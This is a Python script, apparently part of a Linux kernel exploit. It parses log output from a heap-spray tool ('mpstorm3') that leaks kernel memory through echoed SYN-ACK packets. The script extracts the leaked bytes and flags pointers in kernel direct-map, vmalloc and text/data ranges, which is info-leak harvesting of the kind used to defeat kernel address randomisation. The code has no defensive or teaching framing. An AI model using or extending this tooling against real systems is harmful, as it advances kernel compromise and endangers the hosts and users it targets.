#!/usr/bin/env python3
"""reuse_parse.py - parse [###] REUSE hex lines from an mpstorm3 run.

The storm prints the first <=100 bytes (IP header included) of a main-tuple
SYN-ACK that echoed the saved_syn spray marker.  With optlen=107 the copy is
packet[20...], the saved_syn's own TCP header occupies 20..83 and the
neighbour slot's first bytes land at 84..99.
"""
import re
import sys

RANGES = (
    (0xFFFF800000000000, 0xFFFFC87FFFFFFFFF, "direct-map"),
    (0xFFFFC90000000000, 0xFFFFE8FFFFFFFFFF, "vmalloc"),
    (0xFFFFFFFF80000000, 0xFFFFFFFFFFFFFFFF, "text/data"),
)


def kind(v):
    for lo, hi, n in RANGES:
        if lo <= v <= hi:
            return n
    return None


def main(path):
    n = 0
    for line in open(path, errors="replace"):
        if "[###] REUSE" not in line:
            continue
        m = re.search(r"raw=([0-9a-fA-F]+)", line)
        if not m:
            continue
        n += 1
        b = bytes.fromhex(m.group(1))
        print(f"--- reuse #{n} len={len(b)}")
        print(f"    ip: {b[:20].hex(' ')}")
        print(f"    opt/copy[0:64]: {b[20:84].hex(' ')}")
        nb = b[84:100]
        print(f"    neighbour[0:16]: {nb.hex(' ')}")
        for off in range(0, max(1, len(b) - 7)):
            v = int.from_bytes(b[off:off + 8], "little")
            k = kind(v)
            if k:
                print(f"    PTR packet+{off:#04x} {v:#018x} ({k})")
        if len(nb) >= 8:
            for off in range(0, len(nb) - 7):
                v = int.from_bytes(nb[off:off + 8], "little")
                k = kind(v)
                if k:
                    print(f"    NB-PTR nb+{off} {v:#018x} ({k})")
    print(f"== reuse lines: {n}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/reuse-harvest.log"))
